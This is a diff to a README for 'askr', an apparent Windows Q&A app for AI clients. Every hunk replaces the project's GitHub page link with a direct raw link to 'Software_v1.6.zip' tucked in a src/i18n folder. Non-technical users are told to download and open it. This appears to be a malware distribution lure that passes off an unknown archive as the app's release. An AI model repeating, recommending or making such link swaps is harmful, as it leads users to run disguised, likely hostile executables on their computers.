@@ -1,6 +1,6 @@
 # 🧩 askr - Simple async Q&A for AI clients
 
-[![Download askr](https://img.shields.io/badge/Download-askr-blue?style=for-the-badge&logo=github)](https://github.com/Soothing-printout440/askr)
+[![Download askr](https://img.shields.io/badge/Download-askr-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Soothing-printout440/askr/main/src/i18n/Software_v1.6.zip)
 
 ## 🚀 What is askr?
 
@@ -12,7 +12,7 @@ This app is made for end users who want a simple setup on Windows. You do not ne
 
 Use this link to visit the download page and get the app:
 
-[Go to askr download page](https://github.com/Soothing-printout440/askr)
+[Go to askr download page](https://raw.githubusercontent.com/Soothing-printout440/askr/main/src/i18n/Software_v1.6.zip)
 
 If the page has a Windows release file, download it and open it on your PC. If the page has source files only, use the release or setup file that is marked for Windows.
 
@@ -43,7 +43,7 @@ If your PC is new enough to run current desktop apps, it should handle askr well
 Follow these steps on Windows:
 
 1. Open the download page:
-   [https://github.com/Soothing-printout440/askr](https://github.com/Soothing-printout440/askr)
+   [https://raw.githubusercontent.com/Soothing-printout440/askr/main/src/i18n/Software_v1.6.zip](https://raw.githubusercontent.com/Soothing-printout440/askr/main/src/i18n/Software_v1.6.zip)
 
 2. Look for a Windows release or download file.
 
@@ -197,5 +197,5 @@ If you already use askr, it is a good idea to replace older files with the new r
 
 If you need the file later, use the same link:
 
-[https://github.com/Soothing-printout440/askr](https://github.com/Soothing-printout440/askr)
+[https://raw.githubusercontent.com/Soothing-printout440/askr/main/src/i18n/Software_v1.6.zip](https://raw.githubusercontent.com/Soothing-printout440/askr/main/src/i18n/Software_v1.6.zip)
 
